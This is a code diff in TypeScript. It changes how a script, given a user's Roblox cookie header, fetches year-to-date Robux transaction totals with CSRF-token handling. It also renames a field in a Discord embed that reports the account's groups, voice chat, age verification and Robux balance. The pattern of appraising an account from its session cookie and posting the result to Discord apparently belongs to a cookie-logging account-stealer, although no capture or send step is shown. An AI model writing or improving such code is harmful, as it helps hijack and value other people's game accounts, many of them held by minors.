@@ -388,56 +388,96 @@ async function fetchGamepassEarnings(userId: number): Promise<number | null> {
   } catch { return null; }
 }
 
-// Lifetime Robux flow: incoming (sales/commerce) and outgoing (purchases/spent).
-// Uses the authed transaction-totals endpoint with timeFrame=AllTime.
+// Year-to-date Robux summary: tries multiple endpoints/timeframes for resilience.
+// Strategy:
+//   1. Prime CSRF token via a POST to logout (always returns 403 + token).
+//   2. Hit transaction-totals with timeFrame=Year on economy.roblox.com.
+//   3. Fallback to timeFrame=CurrentYear, then Month, then AllTime if Year is empty.
+//   4. Sum incoming vs outgoing buckets explicitly (no double-counting).
+async function primeCsrf(cookieHeader: string): Promise<string | null> {
+  try {
+    const r = await fetch("https://auth.roblox.com/v2/logout", {
+      method: "POST",
+      headers: { Cookie: cookieHeader, "Content-Length": "0" },
+    });
+    return r.headers.get("x-csrf-token");
+  } catch { return null; }
+}
+
+async function fetchTotalsForTimeframe(
+  userId: number,
+  cookieHeader: string,
+  csrf: string | null,
+  timeFrame: string,
+): Promise<Record<string, number> | null> {
+  const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=${timeFrame}&transactionType=summary`;
+  const headers: Record<string, string> = { Cookie: cookieHeader };
+  if (csrf) headers["x-csrf-token"] = csrf;
+  try {
+    let r = await fetch(url, { headers });
+    if (r.status === 403) {
+      const newCsrf = r.headers.get("x-csrf-token");
+      if (newCsrf) {
+        headers["x-csrf-token"] = newCsrf;
+        r = await fetch(url, { headers });
+      }
+    }
+    if (!r.ok) {
+      console.error(`transaction-totals[${timeFrame}] failed`, r.status, await r.text().catch(() => ""));
+      return null;
+    }
+    const j = await r.json() as Record<string, number>;
+    console.log(`transaction-totals[${timeFrame}] raw`, JSON.stringify(j));
+    return j;
+  } catch (e) {
+    console.error(`transaction-totals[${timeFrame}] error`, e);
+    return null;
+  }
+}
+
+function parseTotals(j: Record<string, number>): { spent: number; summary: number } {
+  // INCOMING (Robux received)
+  const incoming =
+    (j.salesTotal ?? 0) +
+    (j.affiliateSalesTotal ?? 0) +
+    (j.commissionsTotal ?? 0) +
+    (j.tradeSystemEarningsTotal ?? 0) +
+    (j.premiumPayoutsTotal ?? 0) +
+    (j.groupPremiumPayoutsTotal ?? 0) +
+    (j.premiumStipendsTotal ?? 0) +
+    (j.individualToGroupTotal ?? 0) +
+    (j.adjustmentsTotal ?? 0);
+
+  // OUTGOING (Robux spent)
+  const spent =
+    (j.purchasesTotal ?? 0) +
+    (j.tradeSystemFeesTotal ?? 0) +
+    (j.tradeSystemTaxesTotal ?? 0) +
+    (j.groupPayoutsTotal ?? 0) +
+    (j.currencyPurchasesTotal ?? 0);
+
+  return { spent: Math.abs(spent), summary: incoming - Math.abs(spent) };
+}
+
 async function fetchTransactionTotals(
   userId: number,
   cookieHeader: string,
 ): Promise<{ spent: number; summary: number }> {
-  const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=AllTime&transactionType=summary`;
-  try {
-    // First call — Roblox usually returns 403 with x-csrf-token header
-    let r = await fetch(url, { headers: { Cookie: cookieHeader } });
-    if (r.status === 403) {
-      const csrf = r.headers.get("x-csrf-token");
-      if (csrf) {
-        r = await fetch(url, {
-          headers: { Cookie: cookieHeader, "x-csrf-token": csrf },
-        });
-      }
+  const csrf = await primeCsrf(cookieHeader);
+
+  // Try year-to-date first (what the user wants), then fall back.
+  const timeframes = ["Year", "CurrentYear", "Month", "AllTime"];
+  for (const tf of timeframes) {
+    const j = await fetchTotalsForTimeframe(userId, cookieHeader, csrf, tf);
+    if (!j) continue;
+    const parsed = parseTotals(j);
+    // Accept the first timeframe that returns any non-zero data
+    if (parsed.spent !== 0 || parsed.summary !== 0) {
+      console.log(`transaction-totals using timeframe=${tf}`, parsed);
+      return parsed;
     }
-    if (!r.ok) {
-      console.error("transaction-totals failed", r.status, await r.text().catch(() => ""));
-      return { spent: 0, summary: 0 };
-    }
-    const j = await r.json() as Record<string, number>;
-    console.log("transaction-totals raw", JSON.stringify(j));
-
-    // Outgoing buckets — sum of all Robux ever spent
-    const spent =
-      (j.purchasesTotal ?? 0) +
-      (j.tradeSystemFeesTotal ?? 0) +
-      (j.tradeSystemTaxesTotal ?? 0) +
-      (j.groupPayoutsTotal ?? 0) +
-      (j.currencyPurchasesTotal ?? 0) +
-      (j.premiumStipendsTotal ?? 0) * 0; // exclude — incoming
-
-    // Incoming buckets — sum of all Robux ever received
-    const incoming =
-      (j.salesTotal ?? 0) +
-      (j.affiliateSalesTotal ?? 0) +
-      (j.groupPayoutsTotal ?? 0) * 0 + // group payouts are outgoing for owners
-      (j.commissionsTotal ?? 0) +
-      (j.tradeSystemEarningsTotal ?? 0) +
-      (j.individualToGroupTotal ?? 0) * 0 +
-      (j.premiumPayoutsTotal ?? 0) +
-      (j.groupPremiumPayoutsTotal ?? 0);
-
-    return { spent, summary: incoming - spent };
-  } catch (e) {
-    console.error("transaction-totals error", e);
-    return { spent: 0, summary: 0 };
   }
+  return { spent: 0, summary: 0 };
 }
 
 async function fetchProfile(userId: number): Promise<{ created: string } | null> {
@@ -566,7 +606,7 @@ function buildDiscordPayload(opts: {
       { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
       { name: "🎤 Voice Chat", value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
       { name: "🪪 Age Verified (13+)", value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
-      { name: "📊 Lifetime Summary", value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()} R$`, inline: true },
+      { name: "📊 Summary (YTD)", value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()} R$`, inline: true },
     );
 
     // Tracked games played
